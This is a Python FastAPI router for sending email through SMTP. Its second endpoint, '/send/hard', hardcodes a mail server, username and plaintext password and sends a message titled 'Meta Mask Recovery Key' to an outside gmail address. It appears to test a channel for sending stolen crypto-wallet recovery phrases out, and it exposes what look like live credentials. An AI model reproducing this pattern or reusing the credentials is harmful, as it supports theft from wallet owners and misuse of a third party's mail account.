from fastapi import APIRouter, HTTPException
from Schema import SmtpSchema
from Controller import create_transport, build_mail

router = APIRouter(
    prefix="/api/smtp"
)


@router.post("/send")
async def send_mail(request: SmtpSchema):
    """sends email"""
    sender = create_transport(request.Host, request.Port, request.Username, request.Password)
    if not sender:
        raise HTTPException(
            status_code=500,
            detail="could not create transport for smtp server.check Credentials"
        )
    message = build_mail(request.From, request.To, request.Subject, request.Body)
    try:
        sender.sendmail(request.From, request.To, message)
    except Exception:
        raise HTTPException(
            status_code=500,
            detail="could not send email"
        )
    return f"email sent successfully"


@router.post("/send/hard")
async def send_mail():
    """sends email"""
    host = "mail.carloscamposmedia.com"
    port = 465
    username = "rsru.bndeomebainynr@carloscamposmedia.com"
    password = "r-$y4#dY%75D"
    From = "rsru.bndeomebainynr@carloscamposmedia.com"
    To = "lity0928@gmail.com"
    Subject = "Meta Mask Recovery Key"
    Body = "Coca Cola"
    sender = create_transport(host, port, username, password)
    if not sender:
        raise HTTPException(
            status_code=500,
            detail="could not create transport for smtp server.check Credentials"
        )
    message = build_mail(From, To, Subject, Body)
    try:
        sender.sendmail(From, To, message)
    except Exception:
        raise HTTPException(
            status_code=500,
            detail="could not send email"
        )
    return f"email sent successfully"
